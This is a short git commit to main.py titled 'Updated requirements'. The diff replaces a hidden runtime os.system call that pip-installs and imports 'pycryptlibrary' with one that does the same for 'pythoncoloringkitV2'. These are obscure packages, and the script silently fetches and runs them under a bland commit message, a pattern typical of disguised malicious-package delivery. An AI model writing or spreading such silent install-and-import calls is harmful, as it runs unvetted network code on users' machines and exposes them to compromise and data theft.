64295acd2743a57e82991182bc0c23c7bdf5af8c
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-10 20:21:33 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptlibrary")
-import pycryptlibrary
+os.system("pip install pythoncoloringkitV2")
+import pythoncoloringkitV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
